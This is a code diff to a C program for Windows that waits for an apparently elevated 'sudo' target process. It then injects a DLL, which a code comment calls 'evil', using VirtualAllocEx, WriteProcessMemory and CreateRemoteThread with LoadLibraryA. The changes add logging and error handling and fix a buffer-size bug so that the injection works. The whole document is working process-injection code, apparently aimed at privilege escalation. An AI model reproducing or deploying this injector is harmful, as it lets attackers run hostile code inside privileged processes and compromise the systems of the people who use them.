@@ -16,11 +16,15 @@ int main(int argc, char **argv) {
 		payload = defaultPayload;
 	}
 
+	printf("Going to inject %s\n", payload);
+
 	HANDLE target_handle = NULL;
 	while (target_handle == NULL) {
+		printf("Finding target process...\n");
 		target_handle = find_sudo_target();
 		Sleep(200);
 	}
+	printf("Injecting DLL, process handle %p\n", target_handle);
 	inject_dll(target_handle, payload);
 }
 
@@ -30,18 +34,32 @@ static HANDLE inject_dll(HANDLE proccessHandle, char dllName[]) {
 		return NULL;
 	}
 	VOID* lb = GetProcAddress(hKernel32, "LoadLibraryA");
+	if (lb == NULL) {
+		printf("Couldn't find LoadLibraryA\n");
+		return NULL;
+	}
 
+	size_t dllNameLen = strlen(dllName);
 	// allocate memory buffer for remote process
-	void *rb = VirtualAllocEx(proccessHandle, NULL, sizeof(dllName), (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
+	void *rb = VirtualAllocEx(proccessHandle, NULL, dllNameLen + 1, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
 	if (rb == NULL) {
 		return NULL;
 	}
 
 	// "copy" evil DLL between processes
-	WriteProcessMemory(proccessHandle, rb, dllName, sizeof(dllName), NULL);
+	WriteProcessMemory(proccessHandle, rb, dllName, dllNameLen, NULL);
 
 	// our process start new thread
 	HANDLE rt = CreateRemoteThread(proccessHandle, NULL, 0, (LPTHREAD_START_ROUTINE)lb, rb, 0, NULL);
+	if (rt == NULL) {
+		printf("Cannot create remote thread.");
+		CloseHandle(proccessHandle);
+		return NULL;
+	}
+
+	printf("Successfully injected DLL and called LoadLibraryA on it.\n");
+	WaitForSingleObject(rt, INFINITE);
+	CloseHandle(rt);
 	CloseHandle(proccessHandle);
 
 	return rt;
